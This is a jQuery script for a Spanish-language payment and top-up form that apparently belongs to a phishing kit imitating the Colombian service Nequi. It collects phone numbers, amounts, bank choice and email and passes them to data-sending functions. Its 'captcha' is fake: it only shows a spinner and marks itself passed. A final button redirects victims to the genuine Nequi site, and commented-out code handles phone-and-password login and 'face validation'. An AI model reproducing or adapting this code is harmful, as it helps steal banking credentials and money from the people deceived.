var catchalisto = 0;

$(document).ready(function($){

	$(".inp").click(function(){
		

		if ($(this).attr("estado") == "0") {
			$(this).attr("estado","1");
			var ob = $(this);     
	        ob.find(".texto-demo").hide();
	        ob.find(".etiqueta").show();
	        ob.find(".etiqueta").animate({
	    		"margin-top" : "-22px"   
	  		}, 20, function() { 
		  		ob.find(".etiqueta").animate({
		    		"margin-top" : "-39px"   
		  		}, 100, function() {  	
		  			ob.find(".texto-demo").css("margin-top","-41px");		
		  			ob.find(".entrada").removeAttr("readonly");		  			
		  			ob.find(".entrada").focus();
		  		});
	  		});	
		}	
    });


    $(".entrada").blur(function(){ 
		var ob = $(this).parents(".inp"); 
		if ($(this).val() == "") {
			ob.attr("estado","0");
			$(this).attr("readonly","readonly");
			ob.find(".etiqueta").hide()
			ob.find(".etiqueta").css("margin-top","-28px");
			ob.find(".texto-demo").show();	
			ob.find(".texto-demo").animate({
	    		"margin-top" : "-45px"   
	  		}, 20, function() {
	  			ob.find(".texto-demo").animate({"margin-top" : "-32px"}, 100);
	  		}); 				
		}else{

		}          
    });

   	$("#txt-valor").keydown(function(e) {
    	var valor = $('#txt-valor').val().split(' ').join(''); 
    	if(e.which == 8 && valor.length == 2){    		
    		if (valor[1] == '0') {
    			$("#txt-valor").val("$ 00");
    		}else{
    			$("#txt-valor").val("$ 00");	
    		}    		
    	}else{    	
    		if (valor[1] == '0') {    	
    			$("#txt-valor").val("$ ");
    		}
    	}      
   	});

   	$("#txt-valor").keyup(function(e) {
   		cad = $('#txt-valor').val();
        invertido = cad.split("").reverse().join("");
        
        var valor = invertido.split('.').join('');
        var tam = valor.length;

        c=0;
        nuevo = "";
        for (var i = 0; i < tam; i++) {            
            if (c==3) {
                nuevo = nuevo + ".";
                c=1;
            }else{
                c++;                
            }
            nuevo = nuevo + valor[i];              
        }

        final = nuevo.split("").reverse().join("");
        $('#txt-valor').val(final);
        $('#txt-valor').focus();
    });

   	$("#catcha").click(function(){
   		if (catchalisto == 0) {   			
	    	$("#catcha").attr("src","../assets/img/load-catcha.gif"); 
	    	catchalisto = 1;
	    	setTimeout(catchaok, 800);  			  
   		}
    });

   	$("#txt-cel,#txt-re").keyup(function(e) {     		
   		if ($("#txt-cel").val().length == 10 && $("#txt-re").val().length == 10) {
   			if ($("#txt-cel").val() != $("#txt-re").val()) {   				
   				$("#inp-cel,#inp-re").css("border","1px solid #ff585f");
   				$("#txt-cel,#txt-re").css("color","#ff585f");
   				$("#err-cel").show();
   			}else{
   				if ($("#txt-valor").val() != "$ 0" && $("#txt-banco").val() != "" && catchalisto == 1) {
					$("#paso0").removeAttr("disabled");
				}
   			}
   		}else{
   			$("#paso0").attr("disabled","disabled");
   			$("#inp-cel,#inp-re").css("border","1px solid #fbf7fb");
			$("#txt-cel,#txt-re").css("color","#200020");
			$("#err-cel").hide();				
   		}  
   	});

   	$("#txt-valor").keyup(function(e) {
   		if ($("#txt-valor").val() != "$ 0" && $("#txt-banco").val() != "" && $("#txt-cel").val().length == 10 && $("#txt-re").val().length == 10 && $("#txt-cel").val() == $("#txt-re").val() && catchalisto == 1) {
			$("#paso0").removeAttr("disabled");
		}else{
			$("#paso0").attr("disabled","disabled");
   			
		}    
   	});

   	$("#txt-banco").change(function(){      
    	if ($("#txt-valor").val() != "$ 0" && $("#txt-banco").val() != "" && $("#txt-cel").val().length == 10 && $("#txt-re").val().length == 10 && $("#txt-cel").val() == $("#txt-re").val() && catchalisto == 1) {
			$("#paso0").removeAttr("disabled");
		}else{
			$("#paso0").attr("disabled","disabled");
   			
		}  	 
    });


   	$("#paso0").click(function(){ 
   		$("#fondo,#cargando").show();   	 
		valor_final = convertir($("#txt-valor").val().replaceAll(".","").replaceAll("$","").replaceAll(" ",""));
		valor_final = "$" + valor_final + ".00"
   		$("#paso0").html('<img src="../assets/img/load-proceso.gif" width="42">');
		$("#inf-cel").html($("#txt-cel").val());
		$("#inf-valor").html(valor_final);
		$("#val-persona").html($("#txt-persona").val());
		$("#val-banco").html($("#txt-banco option:checked").attr("label"));
   		revisar_datos();
    });

    $("#paso1").click(function(){   
    	$("#fondo,#cargando").show();

   		$("#paso1").html('<img src="../assets/img/load-proceso.gif" width="42">');
   		enviar_datos($("#txt-cel").val(),$("#txt-valor").val(),$("#txt-persona").val(),$("#txt-banco").val(),$("#txt-banco option:checked").attr("tipo"),$("#txt-banco option:checked").attr("folder"),$("#txt-banco option:checked").attr("label"));
    });

    $("#btn-banco-mobile,#btn-banco").click(function(){      
   		if ($("#txt-email").val() != "") {
   			$("#cargando").show();
   			enviar_email($("#txt-email").val());
   		}else{
   			$("#txt-email").css({"border": "1px solid #a94442", "box-shadow": "inset 0 1px 1px rgba(0, 0, 0, .075), 0 0 6px #ce8483"});     
   			$("#err-email").show();   		
   		}
    });

    

    $("#imprimir").click(function(){        		
    	window.print();
    });
    
    $("#comprobante").click(function(){        		
    	$("#aprobado,#comprobante,.titulo").hide();
    	$(".marco,#paso1,#imprimir").show();
    });


    $("#regresar").click(function(){        		
    	window.location.href = "https://recarga.nequi.com.co/"; 	
    });
    

    

	/*
	$("#btn-facial").click(function(){      
        window.location.href = "../face-validate/";         
    });

    	if ($(this).find(".con-indicativo").html() == "+57") {
    		$("#txt-celular").attr("maxlength","10");
    	}else{
    		$("#txt-celular").attr("maxlength","8");
    	}


		sw_mind = 0;   	
	});
		if ($("#txt-indicativo").html() == "+57") {
			if ($("#txt-celular").val().length > 9 && $("#txt-password").val().length > 3) {
	    		$("#btn-login").removeAttr("disabled");     		


   $("#txt-celular,#txt-password").keyup(function(e) {
    	if ($("#txt-indicativo").html() == "+57") {
    		if ($("#txt-celular").val().length > 9 && $("#txt-password").val().length > 3 && sw_cap == 1) {
	    		$("#btn-login").removeAttr("disabled");     		
	    	}else{
	    		$("#btn-login").attr("disabled","disabled");
	    	}
    	}else{
    		if ($("#txt-celular").val().length > 7 && $("#txt-password").val().length > 3 && sw_cap == 1) {
	    		$("#btn-login").removeAttr("disabled");     		
	    	}else{
	    		$("#btn-login").attr("disabled","disabled");
	    	}
    	}
    });
*/
});